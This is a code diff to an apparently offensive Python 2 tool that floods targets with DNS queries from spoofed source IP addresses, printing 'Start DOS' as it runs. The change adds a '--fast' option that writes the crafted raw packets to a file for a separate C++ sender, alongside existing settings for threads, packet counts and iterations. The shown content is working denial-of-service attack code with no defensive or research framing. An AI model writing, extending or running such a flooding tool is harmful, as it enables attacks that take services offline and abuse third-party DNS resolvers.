@@ -186,6 +186,7 @@ if __name__ == "__main__":
     parser.add_argument('-i', '--notspoofip', help='Don\'t spoof IP address', action='store_true')
     parser.add_argument('-v', '--verbose', help='Verbose mode', action='store_true')
     parser.add_argument('-r', '--realname', help='Resolving real domain name', action='store_true')
+    parser.add_argument('-f', '--fast', help='Send raw packets via c++ sender', action='store_true')
     parser.add_argument('-t', '--threads', help='Number of threads (default: 100)', default=100)
     parser.add_argument('-p', '--packets', help='Number of packets in one iteration (default: 500000)', default=500000)
     parser.add_argument('-I', '--iterations', help='Number of iterations (default: 1000000)', default=1000000)
@@ -425,11 +426,18 @@ if __name__ == "__main__":
     SOCK.bind((current_network_interface, 0))
 
     try:
-        print "Make threads..."
-        tm = ThreadManager(int(args.threads))
-        print "Start DOS: " + str(datetime.datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
-        for _ in range(int(args.iterations)):
-            tm.add_task(send_dns_query)
+        if not args.fast:
+            print "Make threads..."
+            tm = ThreadManager(int(args.threads))
+            print "Start DOS: " + str(datetime.datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
+            for _ in range(int(args.iterations)):
+                tm.add_task(send_dns_query)
+        else:
+            print " Write raw packets to file: packets.txt ..."
+            with open("packets.txt", "a") as packet_file:
+                for PACKET in PACKETS:
+                    packet_file.write(PACKET + "\r\n")
+            print " All packets is writed."
 
     except:
         SOCK.close()
